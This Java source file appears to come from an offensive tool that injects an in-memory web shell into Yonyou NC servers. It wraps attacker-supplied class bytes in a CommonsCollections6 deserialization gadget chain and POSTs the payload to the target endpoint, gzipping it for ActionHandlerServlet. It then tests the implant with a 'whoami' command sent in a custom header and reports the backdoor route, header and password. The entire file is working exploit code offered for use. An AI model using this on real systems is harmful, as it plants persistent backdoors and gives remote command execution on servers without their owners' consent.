package Memshell;

import yso.payloads.CommonsCollections6NC;
import core.MemShellInterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.zip.GZIPOutputStream;

public class yonyou_Inject_Memshell implements MemShellInterface {
    private static byte[] bytes;


    @Override
    public Boolean inject(String url,String interF,String type,int dirtyN,String[] array, TextArea textArea_memshell) {
        return yyInject(url,interF,type,dirtyN,array,textArea_memshell);
    }

    @Override
    public Boolean injectPrint(String type,String interFace,String PrintType, int dirtyN, String[] array, TextArea textArea_memshell) {
        return yyInjectPrint(type,interFace,PrintType, dirtyN, array, textArea_memshell);
    }

    private Boolean yyInjectPrint(String type,String interFace,String PrintType,int dirtyN,String[] array, TextArea textArea){
        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization","true");
        try {

            byte[] var = new sun.misc.BASE64Decoder().decodeBuffer(array[0]);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            Object var2 = CommonsCollections6NC.getObject(var, array[1], dirtyN);
            oos.writeObject(var2);
            oos.close();
            if(interFace.contains("ActionHandlerServlet")){
                bytes = generateData(var2);
            }else{
                bytes = bos.toByteArray();
            }
            String print = AllMemPrint.getMemPrint("用友NC",bytes, PrintType);
            if(array.length == 4 && array[2] != "define"){
                if(array[2].contains("R4gCmd")){
                    Platform.runLater(() -> {
                        textArea.appendText("\n"+type+"内存马payload("+PrintType+")生成成功！\n"+"请求头: "+array[2]+"\n密码: "+array[3]+"\n\n"+print);
                    });
                }else{
                    Platform.runLater(() -> {
                        textArea.appendText("\n"+type+"内存马payload("+PrintType+")生成成功！\n"+"路由: /R4gApt\n请求头: "+array[2]+"\n密码: "+array[3]+"\n\n"+print);
                    });
                }
            }else{
                Platform.runLater(() -> {
                    textArea.appendText("\n自定义class字节payload("+PrintType+")生成成功！\n\n\n"+print);

                });
            }
            return true;
        }catch (Exception e){
            return false;
        }
    }

    private boolean yyInject(String url,String interFace,String type,int dirtyN,String[] array,TextArea textArea){
        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization","true");
        try {

            byte[] var = new sun.misc.BASE64Decoder().decodeBuffer(array[0]);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            Object var2 = CommonsCollections6NC.getObject(var, array[1], dirtyN);
            oos.writeObject(var2);
            oos.close();
            if(interFace.contains("ActionHandlerServlet")){
                bytes = generateData(var2);
            }else{
                bytes = bos.toByteArray();
            }
            HashMap head = new HashMap();
            if(array[2].contains("R4gCmd")){
                head.put("R4gCmd","whoami");
            }
            Response res = HttpTools.post_byte(url+interFace,bytes,head,"gbk");
            String result = res.getText();
            if(res.getCode()!=404) {
                if (array.length == 4 && array[2]!="define") {
                    if(array[2].contains("R4gCmd")){
                        if(!result.isEmpty()||result!=null){
                            Platform.runLater(() -> {
                                textArea.appendText("\n" + type + " 内存马注入成功！\nurl: " + url +interFace+ "\n请求头: " + array[2] + "\n密码: " + array[3]+"\n回显: "+result.split("\n")[0]);
                            });
                        }else{
                            Platform.runLater(() -> {
                                textArea.appendText("\n" + type + " 内存马注入成功！\nurl: " + url +interFace+ "\n请求头: " + array[2] + "\n密码: " + array[3]+"\n回显失败");
                            });
                        }

                    }else{
                        Platform.runLater(() -> {
                            textArea.appendText("\n" + type + " 内存马注入完成，请自行连接判断！\nurl: " + url + "/R4gApt\n请求头: " + array[2] + "\n密码: " + array[3]);
                        });
                    }

                } else {
                    Platform.runLater(() -> {
                        textArea.appendText("\n" + " 自定义classbyte注入成功！");
                    });
                }
                return true;
            }else{
                Platform.runLater(() -> {
                    textArea.appendText("\n"+type+" 注入失败！");
                });
                return false;
            }

        }catch (Exception e){
            Platform.runLater(() -> {
                textArea.appendText("\n"+type+" 注入失败！");
            });
            return false;
        }
    }

    private static byte[] generateData(Object var1) {
        ByteArrayOutputStream var2 = new ByteArrayOutputStream();

        try {
            GZIPOutputStream var3 = new GZIPOutputStream(var2);
            Throwable var4 = null;

            try {
                ObjectOutputStream var5 = new ObjectOutputStream(var3);
                Throwable var6 = null;

                try {
                    var5.writeObject(var1);
                } catch (Throwable var31) {
                    var6 = var31;
                    throw var31;
                } finally {
                    if (var5 != null) {
                        if (var6 != null) {
                            try {
                                var5.close();
                            } catch (Throwable var30) {
                                var6.addSuppressed(var30);
                            }
                        } else {
                            var5.close();
                        }
                    }

                }
            } catch (Throwable var33) {
                var4 = var33;
                throw var33;
            } finally {
                if (var3 != null) {
                    if (var4 != null) {
                        try {
                            var3.close();
                        } catch (Throwable var29) {
                            var4.addSuppressed(var29);
                        }
                    } else {
                        var3.close();
                    }
                }

            }
        } catch (Exception var35) {
            return null;
        }

        return var2.toByteArray();
    }

}
